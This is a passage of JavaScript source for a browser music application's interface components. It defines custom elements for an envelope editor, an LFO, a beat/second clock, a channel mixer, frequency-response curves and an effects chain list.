		return [ "toggle", "attack", "hold", "decay", "substain", "release" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "toggle": this._changeToggle( val === "true" ); break;
				case "attack":
				case "hold":
				case "decay":
				case "substain":
				case "release":
					this._changeProp( prop, +val );
					break;
			}
		}
	}

	// .........................................................................
	timeSignature( a, b ) {
		this._beatlines.setAttribute( "timesignature", `${ a },${ b }` );
		this.updateWave();
	}
	updateWave( prop, val ) {
		// const w = this._wave;

		// w.type = this.getAttribute( "type" );
		// w.delay = prop === "delay" ? val : +this.getAttribute( "delay" );
		// w.attack = prop === "attack" ? val : +this.getAttribute( "attack" );
		// w.frequency = prop === "speed" ? val : +this.getAttribute( "speed" );
		// w.amplitude = prop === "amp" ? val : +this.getAttribute( "amp" );
		// w.duration =
		// this._dur = Math.max( w.delay + w.attack + 2, this._beatlines.getBeatsPerMeasure() );
		// w.draw();
		this._updatePxPerBeat();
	}

	// .........................................................................
	_changeToggle( b ) {
		this.classList.toggle( "gsuiEnvelope-enable", b );
		this._sliders.attack[ 0 ].enable( b );
		this._sliders.hold[ 0 ].enable( b );
		this._sliders.decay[ 0 ].enable( b );
		this._sliders.substain[ 0 ].enable( b );
		this._sliders.release[ 0 ].enable( b );
	}
	_changeProp( prop, val ) {
		const [ sli, span ] = this._sliders[ prop ];

		sli.setValue( val );
		span.textContent = val.toFixed( 2 );
	}

	// .........................................................................
	_updatePxPerBeat() {
		this._beatlines.setAttribute( "pxperbeat", this._waveWidth / this._dur );
	}
	_initSlider( prop ) {
		const slider = this._sliders[ prop ][ 0 ];

		slider.oninput = this._oninputSlider.bind( this, prop );
		slider.onchange = this._onchangeSlider.bind( this, prop );
	}

	// events:
	// .........................................................................
	_onresize() {
		this._waveWidth = this._beatlines.getBoundingClientRect().width;
		this._updatePxPerBeat();
		// this._wave.resized();
	}
	_onchangeForm( e ) {
		switch ( e.target.name ) {
			case "gsuiEnvelope-toggle": this._dispatch( "toggle" ); break;
		}
	}
	_oninputSlider( prop, val ) {
		this._sliders[ prop ][ 1 ].textContent = val.toFixed( 2 );
		this.updateWave( prop, val );
		this._dispatch( "liveChange", prop, val );
	}
	_onchangeSlider( prop, val ) {
		this._dispatch( "change", prop, val );
	}
}

customElements.define( "gsui-envelope", gsuiEnvelope );

Object.freeze( gsuiEnvelope );

GSUI.setTemplate( "gsui-lfo", () => {
	return [
		GSUI.createElement( "div", { class: "gsuiLFO-head" },
			GSUI.createElement( "label", { class: "gsuiLFO-btn gsuiLFO-toggle", title: "Toggle LFO" },
				GSUI.createElement( "input", { class: "gsuiLFO-btnInput gsuiLFO-toggleCheckbox", name: "gsuiLFO-toggle", type: "checkbox" } ),
				GSUI.createElement( "i", { class: "gsuiLFO-btnIcon gsuiLFO-toggleIcon gsuiIcon", "data-icon": "toggle" } ),
			),
			GSUI.createElement( "span", { class: "gsuiLFO-title" }, "LFO" ),
		),
		GSUI.createElement( "div", { class: "gsuiLFO-graph" },
			GSUI.createElement( "div", { class: "gsuiLFO-wave" },
				GSUI.createElement( "gsui-beatlines", { coloredbeats: "" } ),
				GSUI.createElement( "gsui-periodicwave" ),
			),
			GSUI.createElement( "div", { class: "gsuiLFO-ampSigns" },
				GSUI.createElement( "label", { class: "gsuiLFO-btn gsuiLFO-ampSign" },
					GSUI.createElement( "input", { class: "gsuiLFO-btnInput gsuiLFO-ampSignRadio", name: "gsuiLFO-ampSign", type: "radio", value: "1" } ),
					GSUI.createElement( "i", { class: "gsuiLFO-btnIcon gsuiLFO-ampSignIcon gsuiIcon", "data-icon": "caret-up" } ),
				),
				GSUI.createElement( "label", { class: "gsuiLFO-btn gsuiLFO-ampSign" },
					GSUI.createElement( "input", { class: "gsuiLFO-btnInput gsuiLFO-ampSignRadio", name: "gsuiLFO-ampSign", type: "radio", value: "-1" } ),
					GSUI.createElement( "i", { class: "gsuiLFO-btnIcon gsuiLFO-ampSignIcon gsuiIcon", "data-icon": "caret-down" } ),
				),
			),
		),
		[
			[ "delay", "delay", "del", 0, 4, .03125 ],
			[ "attack", "attack", "att", 0, 4, .03125 ],
			[ "speed", "speed", "spd", .25, 18, .125 ],
			[ "amp", "amplitude", "amp", .001, 1, .001 ],
		].map( ( [ clazz, title, text, min, max, step ] ) => (
			GSUI.createElement( "div", { class: `gsuiLFO-prop gsuiLFO-${ clazz }`, title },
				GSUI.createElement( "div", { class: "gsuiLFO-propLabel" },
					GSUI.createElement( "span", null, text ),
					GSUI.createElement( "div", { class: "gsuiLFO-propValue" } ),
				),
				GSUI.createElement( "div", { class: "gsuiLFO-propContent" },
					GSUI.createElement( "gsui-slider", { type: "linear-x", min, max, step, "mousemove-size": "800" } ),
				),
			)
		) ),
		GSUI.createElement( "div", { class: "gsuiLFO-prop gsuiLFO-type" },
			GSUI.createElement( "div", { class: "gsuiLFO-propLabel" }, "wave" ),
			GSUI.createElement( "div", { class: "gsuiLFO-propContent" },
				[
					[ "sine", "M 1 5 C 1 4 1 1 4 1 C 7 1 7 4 7 5 C 7 6 7 9 10 9 C 13 9 13 6 13 5" ],
					[ "triangle", "M 1 5 L 4 1 L 10 9 L 13 5" ],
					[ "sawtooth", "M 1 5 L 7 1 L 7 9 L 13 5" ],
					[ "square", "M 1 5 L 1 1 L 7 1 L 7 9 L 13 9 L 13 5" ],
				].map( ( [ w, dots ] ) => (
					GSUI.createElement( "label", { class: "gsuiLFO-btn gsuiLFO-typeBtn", title: w },
						GSUI.createElement( "input", { class: "gsuiLFO-btnInput gsuiLFO-typeRadio", name: "gsuiLFO-type", type: "radio", value: w } ),
						GSUI.createElementNS( "svg", { class: "gsuiLFO-btnIcon gsuiLFO-typeSVG", viewBox: "0 0 14 10" }, GSUI.createElementNS( "path", { d: dots } ) ),
					)
				) )
			),
		),
	].flat( 1 );
} );

class gsuiLFO extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-lfo" ),
			elWave = children[ 1 ].firstChild,
			sliders = Object.freeze( {
				delay: [ children[ 2 ].lastChild.firstChild, children[ 2 ].firstChild.lastChild ],
				attack: [ children[ 3 ].lastChild.firstChild, children[ 3 ].firstChild.lastChild ],
				speed: [ children[ 4 ].lastChild.firstChild, children[ 4 ].firstChild.lastChild ],
				amp: [ children[ 5 ].lastChild.firstChild, children[ 5 ].firstChild.lastChild ],
			} );

		super();
		this._children = children;
		this._beatlines = elWave.firstChild;
		this._wave = elWave.lastChild;
		this._sliders = sliders;
		this._dur = 4;
		this._waveWidth = 300;
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiLFO" );
		this._onresize = this._onresize.bind( this );
		Object.seal( this );

		this.onchange = this._onchangeForm.bind( this );
		this._initSlider( "delay" );
		this._initSlider( "attack" );
		this._initSlider( "speed" );
		this._initSlider( "amp" );
	}

	// .........................................................................
	connectedCallback() {
		if ( this._children ) {
			this.classList.add( "gsuiLFO" );
			this.append( ...this._children );
			this._children = null;
		}
		GSUI.observeSizeOf( this, this._onresize );
	}
	disconnectedCallback() {
		GSUI.unobserveSizeOf( this, this._onresize );
	}
	static get observedAttributes() {
		return [ "toggle", "type", "delay", "speed", "attack", "amp" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			const num = +val;

			switch ( prop ) {
				case "toggle": this._changeToggle( val === "true" ); break;
				case "type": this._changeType( val ); break;
				case "delay":
				case "speed":
				case "attack":
					this._changeProp( prop, num );
					break;
				case "amp":
					if ( num > 0 !== prev > 0 ) {
						this._changeAmpSign( num );
					}
					this._changeProp( "amp", Math.abs( num ) );
					break;
			}
		}
	}

	// .........................................................................
	timeSignature( a, b ) {
		this._beatlines.setAttribute( "timesignature", `${ a },${ b }` );
		this.updateWave();
	}
	updateWave( prop, val ) {
		const w = this._wave,
			bPM = this._beatlines.getAttribute( "timesignature" ).split( "," )[ 0 ];

		w.type = this.getAttribute( "type" );
		w.delay = prop === "delay" ? val : +this.getAttribute( "delay" );
		w.attack = prop === "attack" ? val : +this.getAttribute( "attack" );
		w.frequency = prop === "speed" ? val : +this.getAttribute( "speed" );
		w.amplitude = prop === "amp" ? val : +this.getAttribute( "amp" );
		w.duration =
		this._dur = Math.max( w.delay + w.attack + 2, bPM );
		w.draw();
		w.style.opacity = Math.min( 6 / w.frequency, 1 );
		this._updatePxPerBeat();
	}

	// .........................................................................
	_changeToggle( b ) {
		this.classList.toggle( "gsuiLFO-enable", b );
		this.querySelectorAll( ".gsuiLFO-typeRadio" )
			.forEach( b
				? el => el.removeAttribute( "disabled" )
				: el => el.setAttribute( "disabled", "" ) );
		this._sliders.delay[ 0 ].enable( b );
		this._sliders.attack[ 0 ].enable( b );
		this._sliders.speed[ 0 ].enable( b );
		this._sliders.amp[ 0 ].enable( b );
	}
	_changeType( type ) {
		this._wave.type = type;
		this.querySelector( `.gsuiLFO-typeRadio[value="${ type }"]` ).checked = true;
	}
	_changeAmpSign( amp ) {
		this.querySelector( `.gsuiLFO-ampSignRadio[value="${ Math.sign( amp ) || 1 }"]` ).checked = true;
	}
	_changeProp( prop, val ) {
		const [ sli, span ] = this._sliders[ prop ];

		sli.setValue( val );
		span.textContent = val.toFixed( 2 );
	}

	// .........................................................................
	_updatePxPerBeat() {
		this._beatlines.setAttribute( "pxPerBeat", this._waveWidth / this._dur );
	}
	_initSlider( prop ) {
		const slider = this._sliders[ prop ][ 0 ];

		slider.oninput = this._oninputSlider.bind( this, prop );
		slider.onchange = this._onchangeSlider.bind( this, prop );
	}

	// events:
	// .........................................................................
	_onresize() {
		this._waveWidth = this._beatlines.getBoundingClientRect().width;
		this._updatePxPerBeat();
		this._wave.resized();
	}
	_onchangeForm( e ) {
		switch ( e.target.name ) {
			case "gsuiLFO-toggle": this._dispatch( "toggle" ); break;
			case "gsuiLFO-type": this._dispatch( "change", "type", e.target.value ); break;
			case "gsuiLFO-ampSign": this._dispatch( "change", "amp", -this.getAttribute( "amp" ) ); break;
		}
	}
	_oninputSlider( prop, val ) {
		const realval = prop !== "amp"
				? val
				: val * Math.sign( this.getAttribute( "amp" ) );

		this._sliders[ prop ][ 1 ].textContent = val.toFixed( 2 );
		this.updateWave( prop, realval );
		this._dispatch( "liveChange", prop, realval );
	}
	_onchangeSlider( prop, val ) {
		switch ( prop ) {
			case "amp": this._dispatch( "change", prop, val * Math.sign( this.getAttribute( "amp" ) ) ); break;
			default: this._dispatch( "change", prop, val ); break;
		}
	}
}

customElements.define( "gsui-lfo", gsuiLFO );

Object.freeze( gsuiLFO );

GSUI.setTemplate( "gsui-clock", () => [
	GSUI.createElement( "div", { class: "gsuiClock-relative" },
		GSUI.createElement( "div", { class: "gsuiClock-absolute" },
			GSUI.createElement( "div", { class: "gsuiClock-a" }, "0" ),
			GSUI.createElement( "div", { class: "gsuiClock-b" }, "00" ),
			GSUI.createElement( "div", { class: "gsuiClock-c" }, "000" ),
		),
	),
	GSUI.createElement( "button", { class: "gsuiClock-modes" },
		GSUI.createElement( "div", { class: "gsuiClock-mode gsuiClock-beat" } ),
		GSUI.createElement( "div", { class: "gsuiClock-mode gsuiClock-second" } ),
	)
] );

class gsuiClock extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-clock" ),
			elModes = children[ 1 ];

		super();
		this._children = children;
		this.onchangeDisplay = () => {};
		this._attached = false;
		this._wrapRel = children[ 0 ];
		this._wrapAbs = children[ 0 ].firstChild;
		this._timeSave = 0;
		this._firstValueLen = -1;
		this._values = [ -1, -1, -1 ];
		this._nodes = [
			this._wrapAbs.children[ 0 ],
			this._wrapAbs.children[ 1 ],
			this._wrapAbs.children[ 2 ],
		];
		Object.seal( this );

		elModes.onclick = this._onclickModes.bind( this );
	}

	// .........................................................................
	connectedCallback() {
		this._attached = true;
		if ( !this.firstChild ) {
			this.classList.add( "gsuiClock" );
			this.append( ...this._children );
			this._children = null;
			if ( !this.hasAttribute( "bpm" ) ) {
				this.setAttribute( "bpm", 60 );
			}
			if ( !this.hasAttribute( "stepsPerBeat" ) ) {
				this.setAttribute( "stepsPerBeat", 4 );
			}
		}
		this._updateWidth();
	}
	disconnectedCallback() {
		this._attached = false;
	}
	static get observedAttributes() {
		return [ "mode", "bpm", "stepsPerBeat" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "mode":
				case "bpm":
				case "stepsPerBeat":
					this._resetTime();
					break;
			}
		}
	}

	// .........................................................................
	setTime( beats ) {
		const [ a, b, c ] = this.getAttribute( "mode" ) === "second"
				? GSUtils.parseBeatsToSeconds( beats, +this.getAttribute( "bpm" ) )
				: GSUtils.parseBeatsToBeats( beats, +this.getAttribute( "stepsPerBeat" ) );

		this._timeSave = beats;
		this._setValue( 0, a );
		this._setValue( 1, b );
		this._setValue( 2, c );
		if ( this._attached && a.length !== this._firstValueLen ) {
			this._firstValueLen = a.length;
			this._updateWidth();
		}
	}

	// .........................................................................
	_resetTime() {
		this.setTime( this._timeSave );
	}
	_setValue( ind, val ) {
		if ( val !== this._values[ ind ] ) {
			this._nodes[ ind ].textContent =
			this._values[ ind ] = val;
		}
	}
	_updateWidth() {
		const bcr = this._wrapAbs.getBoundingClientRect(),
			st = this._wrapRel.style;

		st.width =
		st.minWidth = `${ bcr.width }px`;
		st.minHeight = `${ bcr.height }px`;
	}

	// .........................................................................
	_onclickModes() {
		const dpl = this.getAttribute( "mode" ) === "second" ? "beat" : "second";

		GSUI.setAttribute( this, "mode", dpl );
		this.onchangeDisplay( dpl );
	}
}

customElements.define( "gsui-clock", gsuiClock );

GSUI.setTemplate( "gsui-mixer", () => (
	GSUI.createElement( "div", { class: "gsuiMixer" },
		GSUI.createElement( "div", { class: "gsuiMixer-panMain" } ),
		GSUI.createElement( "div", { class: "gsuiMixer-panChannels" },
			GSUI.createElement( "button", { class: "gsuiMixer-addChan" },
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "plus" } ),
			),
		),
	)
) );

GSUI.setTemplate( "gsui-mixer-channel", () => (
	GSUI.createElement( "div", { class: "gsuiMixerChannel", draggable: "true" },
		GSUI.createElement( "button", { class: "gsuiMixerChannel-nameWrap" },
			GSUI.createElement( "span", { class: "gsuiMixerChannel-name" } ),
		),
		GSUI.createElement( "button", { class: "gsuiMixerChannel-delete gsuiIcon", "data-icon": "close", title: "Remove the channel" } ),
		GSUI.createElement( "div", { class: "gsuiMixerChannel-analyserWrap" },
			GSUI.createElement( "canvas", { class: "gsuiMixerChannel-analyser" } ),
		),
		GSUI.createElement( "button", { class: "gsuiMixerChannel-toggle gsuiIcon", "data-icon": "toggle" } ),
		GSUI.createElement( "div", { class: "gsuiMixerChannel-pan" },
			GSUI.createElement( "gsui-slider", { type: "circular", min: -1, max: 1, step: .02, "mousemove-size": 800, "stroke-width": 3 } ),
		),
		GSUI.createElement( "div", { class: "gsuiMixerChannel-gain" },
			GSUI.createElement( "gsui-slider", { type: "linear-y", min: 0, max: 1, step: .01, "mousemove-size": 400 } ),
		),
		GSUI.createElement( "button", { class: "gsuiMixerChannel-connect" },
			GSUI.createElement( "i", { class: "gsuiMixerChannel-connectA gsuiIcon", "data-icon": "caret-up" } ),
			GSUI.createElement( "i", { class: "gsuiMixerChannel-connectB gsuiIcon", "data-icon": "caret-up" } ),
		),
		GSUI.createElement( "div", { class: "gsuiMixerChannel-grip gsuiIcon", "data-icon": "grip-h" } ),
	)
) );

class gsuiMixer {
	constructor( opt ) {
		const root = GSUI.getTemplate( "gsui-mixer" ),
			addBtn = root.querySelector( ".gsuiMixer-addChan" );

		this.rootElement = root;
		this._pmain = root.querySelector( ".gsuiMixer-panMain" );
		this._pchans = root.querySelector( ".gsuiMixer-panChannels" );
		this._chans = {};
		this._chanSelected = null;
		this.oninput = opt.oninput;
		this.onchange = opt.onchange;
		this.onselectChan = opt.onselectChan;
		this._analyserW =
		this._analyserH = 0;
		this._attached = false;
		Object.seal( this );

		addBtn.onclick = () => this.onchange( "addChannel" );
		new gsuiReorder( {
			rootElement: root,
			direction: "row",
			dataTransferType: "channel",
			itemSelector: ".gsuiMixerChannel",
			handleSelector: ".gsuiMixerChannel-grip",
			parentSelector: ".gsuiMixer-panChannels",
			onchange: elChan => {
				this.onchange( "reorderChannel", elChan.dataset.id,
					gsuiReorder.listComputeOrderChange( this._pchans, {} ) );
			},
		} );
	}

	// .........................................................................
	attached() {
		const pan = this._pchans;

		this._attached = true;
		pan.style.bottom = `${ pan.clientHeight - pan.offsetHeight }px`;
		this.resized();
	}
	resized() {
		const chans = Object.values( this._chans );

		if ( chans.length ) {
			const { width, height } = chans[ 0 ].analyser.rootElement.getBoundingClientRect();

			this._analyserW = width;
			this._analyserH = height;
			chans.forEach( html => html.analyser.setResolution( width, height ) );
		}
	}
	updateAudioData( id, ldata, rdata ) {
		this._chans[ id ].analyser.draw( ldata, rdata );
	}
	getSelectedChannelId() {
		return this._chanSelected;
	}
	selectChannel( id ) {
		const chan = this._chans[ id ].root,
			pchan = this._chans[ this._chanSelected ];

		pchan && pchan.root.classList.remove( "gsuiMixer-selected" );
		chan.classList.add( "gsuiMixer-selected" );
		this._chanSelected = id;
		this._updateChanConnections();
		this.onselectChan( id );
	}

	// .........................................................................
	addChannel( id, chan ) {
		const root = GSUI.getTemplate( "gsui-mixer-channel" ),
			qs = n => root.querySelector( `.gsuiMixerChannel-${ n }` ),
			pan = qs( "pan gsui-slider" ),
			gain = qs( "gain gsui-slider" ),
			canvas = qs( "analyser" ),
			html = { root, pan, gain,
				name: qs( "name" ),
				connectA: qs( "connectA" ),
				connectB: qs( "connectB" ),
				analyser: new gsuiAnalyser(),
			};

		this._chans[ id ] = html;
		root.dataset.id = id;
		html.analyser.setCanvas( canvas );
		pan.oninput = val => this.oninput( id, "pan", val );
		gain.oninput = val => this.oninput( id, "gain", val );
		pan.onchange = val => this.onchange( "changeChannel", id, "pan", val );
		gain.onchange = val => this.onchange( "changeChannel", id, "gain", val );
		canvas.onclick =
		qs( "nameWrap" ).onclick = this.selectChannel.bind( this, id );
		qs( "toggle" ).onclick = () => this.onchange( "toggleChannel", id );
		qs( "delete" ).onclick = () => this.onchange( "removeChannel", id );
		qs( "connect" ).onclick = () => this.onchange( "redirectChannel", this._chanSelected, id );
		( id === "main" ? this._pmain : this._pchans ).append( root );
		if ( this._attached ) {
			if ( !this._analyserW ) {
				this.resized();
			}
			html.analyser.setResolution( this._analyserW, this._analyserH );
		}
		if ( this._chanSelected ) {
			this._updateChanConnections();
		} else if ( id === "main" ) {
			this.selectChannel( id );
		}
	}
	removeChannel( id ) {
		const el = this._chans[ id ].root;

		if ( id === this._chanSelected ) {
			const next = this._getNextChan( el, "nextElementSibling" );

			if ( next ) {
				this.selectChannel( next.dataset.id );
			} else {
				const prev = this._getNextChan( el, "previousElementSibling" );

				this.selectChannel( prev ? prev.dataset.id : "main" );
			}
		}
		delete this._chans[ id ];
		el.remove();
	}
	toggleChannel( id, b ) {
		this._chans[ id ].root.classList.toggle( "gsuiMixerChannel-muted", !b );
	}
	changePanChannel( id, val ) {
		this._chans[ id ].pan.setValue( val );
	}
	changeGainChannel( id, val ) {
		this._chans[ id ].gain.setValue( val );
	}
	renameChannel( id, name ) {
		this._chans[ id ].name.textContent = name;
	}
	reorderChannel( id, n ) {
		this._chans[ id ].root.dataset.order = n;
	}
	reorderChannels( channels ) {
		gsuiReorder.listReorder( this._pchans, channels );
	}
	redirectChannel( id, dest ) {
		this._chans[ id ].root.dataset.dest = dest;
		this._updateChanConnections();
	}

	// private:
	// .........................................................................
	_getNextChan( el, dir ) {
		const sibling = el[ dir ];

		return sibling && "id" in sibling.dataset ? sibling : null;
	}
	_updateChanConnections() {
		const selId = this._chanSelected;

		if ( selId ) {
			const html = this._chans[ selId ],
				chanDest = html.root.dataset.dest;
			let bOnce = false;

			Object.entries( this._chans ).forEach( ( [ id, html ] ) => {
				const a = id === chanDest,
					b = html.root.dataset.dest === selId;

				html.connectA.dataset.icon = a ? "caret-up" : "";
				html.connectB.dataset.icon = b ? "caret-down" : "";
				bOnce = bOnce || b;
			} );
			html.connectA.dataset.icon = selId !== "main" ? "caret-down" : "";
			html.connectB.dataset.icon = bOnce ? "caret-up" : "";
		}
	}
}

GSUI.setTemplate( "gsui-curves", () => (
	GSUI.createElementNS( "svg", { class: "gsuiCurves-svg", preserveAspectRatio: "none" },
		GSUI.createElementNS( "line", { class: "gsuiCurves-line", "shape-rendering": "crispEdges" } ),
		GSUI.createElementNS( "g", { class: "gsuiCurves-marks" } ),
		GSUI.createElementNS( "g", { class: "gsuiCurves-curves" } ),
	)
) );

class gsuiCurves extends HTMLElement {
	constructor() {
		const svg = GSUI.getTemplate( "gsui-curves" );

		super();
		this._svg = svg;
		this._line = svg.querySelector( ".gsuiCurves-line" );
		this._marksWrap = svg.querySelector( ".gsuiCurves-marks" );
		this._curvesWrap = svg.querySelector( ".gsuiCurves-curves" );
		this._curves = new Map();
		this._options = Object.seal( {
			nyquist: 24000,
			nbBands: 8,
		} );
		this._size = Object.seal( [ 0, 0 ] );
		Object.freeze( this );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiCurves" );
			this.append( this._svg );
		}
	}

	// .........................................................................
	resized() {
		const bcr = this._svg.getBoundingClientRect(),
			w = bcr.width,
			h = bcr.height;

		this._size[ 0 ] = w;
		this._size[ 1 ] = h;
		this._svg.setAttribute( "viewBox", `0 0 ${ w } ${ h }` );
		this.redraw();
	}
	options( opt ) {
		Object.assign( this._options, opt );
		if ( "nbBands" in opt || "nyquist" in opt ) {
			this._updateHzTexts();
		}
	}
	setCurve( id, curve ) {
		const path = this._curvesWrap.querySelector( `[data-id="${ id }"]` );

		if ( curve ) {
			this._curves.set( id, curve );
			if ( path ) {
				path.setAttribute( "d", this._createPathD( curve ) );
			} else {
				this._createPath( id, curve );
			}
		} else {
			this._curves.delete( id );
			path.remove();
		}
	}
	redraw() {
		this._updateHzTexts();
		this._updateLinePos();
		this._curves.forEach( ( curve, id ) => {
			this._curvesWrap.querySelector( `[data-id="${ id }"]` )
				.setAttribute( "d", this._createPathD( curve ) );
		} );
	}
	getWidth() {
		return this._size[ 0 ];
	}

	// .........................................................................
	_updateLinePos() {
		const line = this._line,
			[ w, h ] = this._size;

		line.setAttribute( "x1", 0 );
		line.setAttribute( "x2", w );
		line.setAttribute( "y1", h / 2 );
		line.setAttribute( "y2", h / 2 );
	}
	_updateHzTexts() {
		const [ w, h ] = this._size,
			nb = this._options.nbBands,
			nyquist = this._options.nyquist,
			rects = [],
			marks = [];

		for ( let i = 0; i < nb; ++i ) {
			const txt = document.createElementNS( "http://www.w3.org/2000/svg", "text" ),
				Hz = Math.round( nyquist * ( 2 ** ( i / nb * 11 - 11 ) ) ),
				x = i / nb * w | 0;

			txt.setAttribute( "x", x + 3 );
			txt.setAttribute( "y", 14 );
			txt.classList.add( "gsuiCurves-markText" );
			txt.textContent = Hz < 1000 ? Hz : `${ ( Hz / 1000 ).toFixed( 1 ) }k`;
			marks.push( txt );
			if ( i % 2 === 0 ) {
				const rect = document.createElementNS( "http://www.w3.org/2000/svg", "rect" );

				rect.setAttribute( "x", x );
				rect.setAttribute( "y", 0 );
				rect.setAttribute( "width", w / nb | 0 );
				rect.setAttribute( "height", h );
				rect.setAttribute( "shape-rendering", "crispEdges" );
				rect.classList.add( "gsuiCurves-markBg" );
				rects.push( rect );
			}
		}
		while ( this._marksWrap.lastChild ) {
			this._marksWrap.lastChild.remove();
		}
		this._marksWrap.append( ...rects, ...marks );
	}
	_createPath( id, curve ) {
		const path = document.createElementNS( "http://www.w3.org/2000/svg", "path" );

		path.classList.add( "gsuiCurves-curve" );
		path.dataset.id = id;
		path.setAttribute( "d", this._createPathD( curve ) );
		this._curvesWrap.append( path );
	}
	_createPathD( curve ) {
		const w = this._size[ 0 ],
			len = curve.length,
			d = [ `M 0 ${ this._dbToY( curve[ 0 ] ) } ` ];

		for ( let i = 1; i < len; ++i ) {
		    d.push( `L ${ i / len * w | 0 } ${ this._dbToY( curve[ i ] ) } ` );
		}
		return d.join( "" );
	}
	_dbToY( db ) {
		const h = this._size[ 1 ],
			y = 20 * Math.log( Math.max( db, .0001 ) ) / Math.LN10;

		return h / 2 - y * ( h / 100 );
	}
}

customElements.define( "gsui-curves", gsuiCurves );

GSUI.setTemplate( "gsui-effects", () => (
	GSUI.createElement( "div", { class: "gsuiEffects-list" },
		GSUI.createElement( "button", { class: "gsuiEffects-addBtn" },
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "plus" } ),
		),
		GSUI.createElement( "select", { class: "gsuiEffects-addSelect", size: 4 } ),
	)
) );

GSUI.setTemplate( "gsui-effects-fx", () => (
	GSUI.createElement( "div", { class: "gsuiEffects-fx", draggable: "true" },
		GSUI.createElement( "div", { class: "gsuiEffects-fx-head" },
			GSUI.createElement( "div", { class: "gsuiEffects-fx-grip gsuiIcon", "data-icon": "grip-v" } ),
			GSUI.createElement( "button", { class: "gsuiEffects-fx-expand gsuiIcon", "data-icon": "caret-right" } ),
			GSUI.createElement( "button", { class: "gsuiEffects-fx-toggle gsuiIcon", "data-icon": "toggle", title: "Toggle this effect" } ),
			GSUI.createElement( "span", { class: "gsuiEffects-fx-name" } ),
			GSUI.createElement( "button", { class: "gsuiEffects-fx-remove gsuiIcon", "data-icon": "close", title: "Delete this effect" } ),
		),
		GSUI.createElement( "div", { class: "gsuiEffects-fx-content" } ),
	)
) );

class gsuiEffects extends HTMLElement {
	constructor() {
		const elFxsList = GSUI.getTemplate( "gsui-effects" ),
			elBtnSelect = elFxsList.querySelector( ".gsuiEffects-addBtn" ),
			elAddSelect = elFxsList.querySelector( ".gsuiEffects-addSelect" );

		super();
		this.askData = () => {};
		this._fxsHtml = new Map();
		this._elFxsList = elFxsList;
		this._elAddSelect = elAddSelect;
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiEffects" );
		Object.seal( this );

		elBtnSelect.onclick = () => this._elAddSelect.value = "";
		elAddSelect.onchange = this._onchangeAddSelect.bind( this );
		elAddSelect.onkeydown = () => false;
		new gsuiReorder( {
			rootElement: elFxsList,
			direction: "column",
			dataTransferType: "effect",
			itemSelector: ".gsuiEffects-fx",
			handleSelector: ".gsuiEffects-fx-grip",
			parentSelector: ".gsuiEffects-list",
		} );
		GSUI.listenEvent( this, {
			default: {
				liveChange: ( d, e ) => {
					d.args.unshift( e.target.dataset.id );
					d.component = "gsuiEffects";
					d.eventName = "liveChangeEffect";
					return true;
				},
				changeProp: ( d, e ) => {
					d.args.unshift( e.target.dataset.id );
					d.component = "gsuiEffects";
					d.eventName = "changeEffect";
					return true;
				},
			},
		} );
		this._fillSelect();
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiEffects" );
			this.append( this._elFxsList );
		}
	}

	// .........................................................................
	expandToggleEffect( id ) {
		const root = this._fxsHtml.get( id ).root;

		this.expandEffect( id, !root.classList.contains( "gsuiEffects-fx-expanded" ) );
	}
	expandEffect( id, b ) {
		const html = this._fxsHtml.get( id ),
			type = html.root.dataset.type;

		html.root.classList.toggle( "gsuiEffects-fx-expanded", b );
		html.expand.dataset.icon = b ? "caret-down" : "caret-right";
		html.content.style.height = `${ b ? gsuiEffects.fxsMap.get( type ).height : 0 }px`;
	}

	// .........................................................................
	addEffect( id, fx ) {
		const root = GSUI.getTemplate( "gsui-effects-fx" ),
			name = root.querySelector( ".gsuiEffects-fx-name" ),
			expand = root.querySelector( ".gsuiEffects-fx-expand" ),
			toggle = root.querySelector( ".gsuiEffects-fx-toggle" ),
			remove = root.querySelector( ".gsuiEffects-fx-remove" ),
			content = root.querySelector( ".gsuiEffects-fx-content" ),
			fxAsset = gsuiEffects.fxsMap.get( fx.type ),
			uiFx = new fxAsset.cmp(),
			html = Object.seal( {
				uiFx,
				root,
				expand,
				content,
			} );

		expand.onclick = () => this.expandToggleEffect( id );
		toggle.onclick = () => this._dispatch( "toggleEffect", id );
		remove.onclick = () => this._dispatch( "removeEffect", id );
		uiFx.askData = this.askData.bind( null, id, fx.type );
		uiFx.dataset.id = id;
		root.dataset.type = fx.type;
		name.textContent = fxAsset.name;
		content.append( uiFx );
		this._fxsHtml.set( id, html );
		this._elFxsList.append( root );
	}
	removeEffect( id ) {
		this._fxsHtml.get( id ).root.remove();
		this._fxsHtml.delete( id );
	}
	changeEffect( id, prop, val ) {
		switch ( prop ) {
			case "toggle": this._changeToggle( id, val ); break;
			case "order": this._fxsHtml.get( id ).root.dataset.order = val; break;
		}
	}
	_changeToggle( id, b ) {
		const html = this._fxsHtml.get( id );

		html.root.classList.toggle( "gsuiEffects-fx-enable", b );
		html.uiFx.toggle( b );
	}
	reorderEffects( effects ) {
		gsuiReorder.listReorder( this._elFxsList, effects );
	}

	// events:
	// .........................................................................
	_onchangeAddSelect() {
		const type = this._elAddSelect.value;

		this._elAddSelect.blur();
		this._elAddSelect.value = "";
		this._dispatch( "addEffect", type );
	}

	// .........................................................................
	_createOption( enable, fxId, fxName ) {
		const opt = document.createElement( "option" );

		opt.value = fxId;
		opt.disabled = !enable;
		opt.textContent = fxName;
		return opt;
	}
	_fillSelect() {
		const def = this._createOption( false, "", "-- Select an Fx" ),
			options = [ def ];

		gsuiEffects.fxsMap.forEach( ( fx, id ) => {
			options.push( this._createOption( true, id, fx.name ) );
		} );
		this._elAddSelect.append( ...options );
	}
}

gsuiEffects.fxsMap = new Map();

customElements.define( "gsui-effects", gsuiEffects );

GSUI.setTemplate( "gsui-fx-filter", () => [
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaType" },
		GSUI.createElement( "span", { class: "gsuiFxFilter-area-label" }, "type" ),
